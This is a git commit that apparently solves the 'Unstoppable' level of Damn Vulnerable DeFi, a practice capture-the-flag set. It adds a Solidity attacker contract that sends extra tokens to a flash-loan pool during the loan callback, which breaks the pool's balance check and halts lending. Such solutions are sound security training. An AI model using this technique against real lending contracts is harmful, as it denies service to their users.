dd750ebe8067ed23a315f08c111e4b34ab02f7bc
Vlad Andrievski <andryieuski@papaya.land>
2023-01-09 20:16:19 +0300

    Complete Unstoppable level

---
+++ contracts/unstoppable/ReceiverUnstoppableAttacker.sol
@@ -0,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../unstoppable/UnstoppableLender.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+/**
+ * @title ReceiverUnstoppable
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract ReceiverUnstoppableAttacker {
+    UnstoppableLender private immutable pool;
+    address private immutable owner;
+
+    constructor(address poolAddress) {
+        pool = UnstoppableLender(poolAddress);
+        owner = msg.sender;
+    }
+
+    // Pool will call this function during the flash loan
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        require(msg.sender == address(pool), "Sender must be pool");
+
+        IERC20(tokenAddress).transfer(msg.sender, 100);
+
+        require(
+            IERC20(tokenAddress).transfer(msg.sender, amount),
+            "Transfer of tokens failed"
+        );
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        require(msg.sender == owner, "Only owner can execute flash loan");
+        pool.flashLoan(amount);
+    }
+}
